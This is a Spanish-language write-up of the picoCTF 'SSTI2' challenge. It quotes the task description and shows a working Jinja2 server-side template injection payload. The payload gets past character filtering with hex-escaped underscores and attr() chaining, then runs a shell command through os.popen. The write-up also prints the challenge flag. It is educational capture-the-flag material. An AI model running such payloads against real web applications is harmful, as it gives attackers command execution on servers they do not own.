## Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51790/)!

## Solución
Se aprecia el mismo sitio web del ejercicio SSTI1, se intenta usar el comando de la solución anterior pero es rechazado, se revisa de nuevo la documentación ofrecida por onsecurity y se encuentra lo siguiente por si se filtran puntos, guiones bajos y corchetes:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```
Demostrando de nuevo el contenido del directorio actual y se hace cat al archivo flag para obtener la bandera

```
# picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
```

## Referencias
* https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/